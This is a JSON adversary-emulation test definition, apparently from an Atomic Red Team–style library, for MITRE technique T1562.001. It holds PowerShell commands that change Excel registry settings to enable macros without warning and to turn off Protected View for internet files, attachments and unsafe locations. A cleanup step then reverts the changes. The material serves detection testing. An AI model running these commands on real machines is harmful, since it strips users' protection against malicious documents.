@@ -1,0 +1,44 @@
+{
+  "id": "6f5fb61b-4e56-4a3d-a8c3-82e13686c6d7",
+  "name": "Disable Microsoft Office Security Features",
+  "description": "Gorgon group may disable Office security features so that their code can run. Upon execution, an external document will not\nshow any warning before editing the document.\n\n\nhttps://unit42.paloaltonetworks.com/unit42-gorgon-group-slithering-nation-state-cybercrime/\n",
+  "platforms": [
+    "windows"
+  ],
+  "steps": [
+    {
+      "id": "f1e69bde-c554-4918-bb79-d0fe2a54b312",
+      "type": "execute-command",
+      "data": {
+        "command": "New-Item -Path \"HKCU:\\Software\\Microsoft\\Office\\16.0\\Excel\"\nNew-Item -Path \"HKCU:\\Software\\Microsoft\\Office\\16.0\\Excel\\Security\"\nNew-Item -Path \"HKCU:\\Software\\Microsoft\\Office\\16.0\\Excel\\Security\\ProtectedView\"\nNew-ItemProperty -Path \"HKCU:\\Software\\Microsoft\\Office\\16.0\\Excel\\Security\" -Name \"VBAWarnings\" -Value \"1\" -PropertyType \"Dword\"\nNew-ItemProperty -Path \"HKCU:\\Software\\Microsoft\\Office\\16.0\\Excel\\Security\\ProtectedView\" -Name \"DisableInternetFilesInPV\" -Value \"1\" -PropertyType \"Dword\"\nNew-ItemProperty -Path \"HKCU:\\Software\\Microsoft\\Office\\16.0\\Excel\\Security\\ProtectedView\" -Name \"DisableUnsafeLocationsInPV\" -Value \"1\" -PropertyType \"Dword\"\nNew-ItemProperty -Path \"HKCU:\\Software\\Microsoft\\Office\\16.0\\Excel\\Security\\ProtectedView\" -Name \"DisableAttachementsInPV\" -Value \"1\" -PropertyType \"Dword\"\n",
+        "command_type": "powershell"
+      },
+      "elevation_required": false
+    },
+    {
+      "id": "9d36589f-f440-4c0d-8700-d67a290ef3a4",
+      "type": "execute-command",
+      "data": {
+        "command": "Remove-ItemProperty -Path \"HKCU:\\Software\\Microsoft\\Office\\16.0\\Excel\\Security\" -Name \"VBAWarnings\" -ErrorAction Ignore | Out-Null\nRemove-Item -Path \"HKCU:\\Software\\Microsoft\\Office\\16.0\\Excel\\Security\\ProtectedView\" -ErrorAction Ignore\n",
+        "command_type": "powershell"
+      },
+      "elevation_required": false
+    }
+  ],
+  "flows": [
+    {
+      "s": "f1e69bde-c554-4918-bb79-d0fe2a54b312",
+      "p": "on-success",
+      "o": "9d36589f-f440-4c0d-8700-d67a290ef3a4"
+    },
+    {
+      "s": "f1e69bde-c554-4918-bb79-d0fe2a54b312",
+      "p": "on-failure",
+      "o": "9d36589f-f440-4c0d-8700-d67a290ef3a4"
+    }
+  ],
+  "tags": [
+    "T1562.001",
+    "atomic-red-team"
+  ]
+}
